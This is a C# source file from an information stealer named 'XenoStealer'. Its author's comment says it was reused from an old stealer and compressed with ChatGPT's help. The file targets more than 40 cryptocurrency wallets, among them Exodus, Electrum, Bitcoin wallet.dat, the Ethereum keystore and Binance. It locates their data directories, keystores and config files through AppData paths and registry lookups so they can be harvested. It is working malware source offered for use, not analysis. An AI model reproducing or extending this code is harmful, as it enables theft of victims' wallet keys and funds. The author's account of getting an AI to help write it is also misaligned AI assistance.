using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealer
{
    public static class Crypto//all this data bellow was taken from my old stealer, had to play around with it, but I was able to get chatgpt to compress it to this. the amazements of tech. sadly its not at the point yet where it does all of it on its own, i still had to fix a bunch up, but it most def saved me time. amazing.
    {
        public static DataExtractionStructs.CryptoInfo[] GetInfo() 
        {
            List<DataExtractionStructs.CryptoInfo> cryptoInfos = new List<DataExtractionStructs.CryptoInfo>();

            foreach (KeyValuePair<string, string> i in directoryPaths) 
            {
                if (i.Value != null) 
                {
                    cryptoInfos.Add(new DataExtractionStructs.CryptoInfo(i.Key, i.Value, false));
                }
            }

            foreach (KeyValuePair<string, string> i in filePaths)
            {
                if (i.Value != null)
                {
                    cryptoInfos.Add(new DataExtractionStructs.CryptoInfo(i.Key, i.Value, true));
                }
            }

            return cryptoInfos.ToArray();
        }



        private static readonly Dictionary<string, string> directoryPaths = new Dictionary<string, string>
        {
            { "Coinomi", GetDirectoryPath(Configuration.localAppData, "Coinomi", "Coinomi", "wallets") ?? GetDirectoryPath(Configuration.roamingAppData, "Coinomi", "Coinomi", "wallets") },
            { "Armory", GetDirectoryPath(Configuration.roamingAppData, "Armory") },
            { "Bytecoin", GetDirectoryPath(Configuration.roamingAppData, "bytecoin") },
            { "MultiBit", GetDirectoryPath(Configuration.roamingAppData, "MultiBit") },
            { "Exodus", GetDirectoryPath(Configuration.roamingAppData, "Exodus", "exodus.wallet") },
            { "Ethereum", GetDirectoryPath(Configuration.roamingAppData, "Ethereum", "keystore") },
            { "Electrum", GetDirectoryPath(Configuration.roamingAppData, "Electrum", "wallets") },
            { "ElectrumLTC", GetDirectoryPath(Configuration.roamingAppData, "Electrum-LTC", "wallets") },
            { "AtomicWallet", GetDirectoryPath(Configuration.roamingAppData, "atomic", "Local Storage", "leveldb") },
            { "Guarda", GetDirectoryPath(Configuration.roamingAppData, "Guarda", "Local Storage", "leveldb") },
            { "WalletWasabi", GetDirectoryPath(Configuration.roamingAppData, "WalletWasabi", "Client", "Wallets") },
            { "ElectronCash", GetDirectoryPath(Configuration.roamingAppData, "ElectronCash", "wallets") },
            { "Sparrow", GetDirectoryPath(Configuration.roamingAppData, "Sparrow", "wallets") },
            { "IOCoin", GetDirectoryPath(Configuration.roamingAppData, "IOCoin") },
            { "PPCoin", GetDirectoryPath(Configuration.roamingAppData, "PPCoin") },
            { "BBQCoin", GetDirectoryPath(Configuration.roamingAppData, "BBQCoin") },
            { "Mincoin", GetDirectoryPath(Configuration.localAppData, "Mincoin") ?? GetDirectoryPath(Configuration.roamingAppData, "Mincoin") },
            { "DevCoin", GetDirectoryPath(Configuration.roamingAppData, "devcoin") },
            { "YACoin", GetDirectoryPath(Configuration.roamingAppData, "YACoin") },
            { "Franko", GetDirectoryPath(Configuration.localAppData, "Franko") ?? GetDirectoryPath(Configuration.roamingAppData, "Franko") },
            { "FreiCoin", GetDirectoryPath(Configuration.localAppData, "FreiCoin") ?? GetDirectoryPath(Configuration.roamingAppData, "FreiCoin") },
            { "InfiniteCoin", GetDirectoryPath(Configuration.localAppData, "Infinitecoin") ?? GetDirectoryPath(Configuration.roamingAppData, "Infinitecoin") },
            { "GoldCoinGLD", GetDirectoryPath(Configuration.localAppData, "GoldCoinGLD") ?? GetDirectoryPath(Configuration.roamingAppData, "GoldCoinGLD") ?? GetDirectoryPath(Configuration.localAppData, "GoldCoin (GLD)") ?? GetDirectoryPath(Configuration.roamingAppData, "GoldCoin (GLD)") },
            { "Binance", GetDirectoryPath(Configuration.roamingAppData, "Binance", "Local Storage", "leveldb") },
            { "Terracoin", GetDirectoryPath(Configuration.localAppData, "Terracoin") ?? GetDirectoryPath(Configuration.roamingAppData, "Terracoin") },
            { "DaedalusMainnet", GetDirectoryPath(Configuration.roamingAppData, "Daedalus Mainnet") },
            { "MyMonero", GetDirectoryPath(Configuration.roamingAppData, "MyMonero", "Local Storage", "leveldb") },
            { "MyCrypto", GetDirectoryPath(Configuration.roamingAppData, "MyCrypto", "Local Storage", "leveldb") },
            { "Bisq", GetDirectoryPath(Configuration.roamingAppData, "Bisq", "btc_mainnet", "wallet") },
            { "Bisq_db", GetDirectoryPath(Configuration.roamingAppData, "Bisq", "btc_mainnet", "db") },
            { "Bisq_keys", GetDirectoryPath(Configuration.roamingAppData, "Bisq", "btc_mainnet", "keys") },
            { "Zap", GetDirectoryPath(Configuration.roamingAppData, "Zap", "Local Storage", "leveldb") },
            { "Simpleos", GetDirectoryPath(Configuration.roamingAppData, "simpleos", "Local Storage", "leveldb") },
            { "Neon", GetDirectoryPath(Configuration.roamingAppData, "Neon", "storage") },
            { "bitmonero", GetDirectoryPath(Configuration.programFiles, "bitmonero", "lmdb") ?? GetDirectoryPath(Configuration.programFilesX86, "bitmonero", "lmdb") },
            { "Etherwall", GetEtherwallPath() }
        };

        private static readonly Dictionary<string, string> filePaths = new Dictionary<string, string>
        {
            { "DashCore", GetFilePath(GetRegistryPatternWallet("Dash"), "wallet.dat") },
            { "Litecoin", GetFilePath(GetRegistryPatternWallet("Litecoin"), "wallet.dat") },
            { "Bitcoin", GetFilePath(GetRegistryPatternWallet("Bitcoin"), "wallet.dat") },
            { "Dogecoin", GetFilePath(GetRegistryPatternWallet("Dogecoin"), "wallet.dat") },
            { "Qtum", GetFilePath(GetRegistryPatternWallet("Qtum"), "wallet.dat") },
            { "Electrum_config", GetFilePath(Configuration.roamingAppData, "Electrum", "config") },
            { "ElectrumLTC_config", GetFilePath(Configuration.roamingAppData, "Electrum-LTC", "config") },
            { "WalletWasabi_config", GetFilePath(Configuration.roamingAppData, "WalletWasabi", "Client", "Config.json") },
            { "ElectronCash_config", GetFilePath(Configuration.roamingAppData, "ElectronCash", "config") },
            { "Sparrow_config", GetFilePath(Configuration.roamingAppData, "Sparrow", "config") },
            { "AtomicDEX", GetFilePath(Configuration.roamingAppData, "atomic_qt", "config") },
            { "Binance_wallet_config", GetFilePath(Configuration.roamingAppData, "Binance", "config") }
        };

        private static string GetDirectoryPath(params string[] paths)
        {
            if (paths.Contains(null))
            {
                return null;
            }
            string directoryPath = Path.Combine(paths);
            return Directory.Exists(directoryPath) ? directoryPath : null;
        }

        private static string GetFilePath(params string[] paths)
        {
            if (paths.Contains(null)) 
            {
                return null;
            }
            string filePath = Path.Combine(paths);
            return File.Exists(filePath) ? filePath : null;
        }

        private static string GetRegistryPatternWallet(string name)
        {
            string basePath = $@"Software\{name}\{name}-Qt";
            object _dataDir=Utils.ReadRegistryKeyValue(RegistryHive.CurrentUser, basePath, "strDataDir");
            if (_dataDir == null || _dataDir.GetType() != typeof(string)) 
            {
                return null;
            }
            string dataDir = (string)_dataDir;
            if (!Directory.Exists(dataDir)) 
            {
                return null;
            }
            return dataDir;
        }

        private static string GetEtherwallPath()
        {
            string basePath = $@"Software\Etherdyne\Etherwall\geth";
            object _dataDir = Utils.ReadRegistryKeyValue(RegistryHive.CurrentUser, basePath, "KeyStore");
            if (_dataDir == null || _dataDir.GetType() != typeof(string))
            {
                return null;
            }
            string dataDir = (string)_dataDir;
            if (!Directory.Exists(dataDir))
            {
                return null;
            }
            return dataDir;
        }


    }
}
